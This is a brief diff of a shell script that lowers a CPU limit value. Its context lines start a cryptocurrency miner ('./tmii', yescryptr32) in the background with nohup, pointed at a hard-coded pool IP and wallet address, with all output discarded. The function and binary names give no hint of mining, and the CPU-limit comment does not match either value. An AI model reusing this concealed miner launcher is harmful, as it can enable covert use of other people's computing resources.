@@ -31,7 +31,7 @@ start_magic() {
   local worker=$(generate_worker $num_cores)  # Generate worker string including core count
 
   # Limiting CPU usage to 40%
-  local cpu_limit=2000
+  local cpu_limit=70
   
   # Start the mining process
   nohup ./tmii -a yescryptr32 --pool 45.115.225.129:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > /dev/null 2>&1 &
